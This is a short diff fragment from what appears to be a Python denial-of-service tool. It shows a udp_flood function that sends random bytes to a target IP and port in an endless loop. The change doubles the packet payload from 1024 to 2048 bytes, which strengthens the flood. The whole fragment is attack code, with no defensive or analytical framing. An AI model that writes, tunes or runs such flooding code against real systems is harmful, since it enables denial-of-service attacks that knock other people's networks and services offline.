@@ -17,7 +17,7 @@ def get_time():
 def udp_flood():
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     thread_id = threading.get_ident()
-    bytes_data = random._urandom(1024)
+    bytes_data = random._urandom(2048)
     while True:
         try:
             sock.sendto(bytes_data, (target_ip, target_port))
